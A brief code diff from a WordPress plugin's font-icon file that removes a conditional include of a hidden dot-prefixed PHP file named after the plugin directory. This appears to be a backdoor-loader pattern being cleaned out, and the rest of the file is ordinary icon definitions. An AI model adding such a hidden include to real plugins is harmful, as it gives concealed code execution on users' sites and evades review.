@@ -15,10 +15,6 @@ add_filter( 'welaunch/font-icons', 'welaunch_get_font_icons' );
  *
  * @return array
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function welaunch_get_font_icons() {
 	$elusive_icons = array(
 		'el el-address-book-alt',
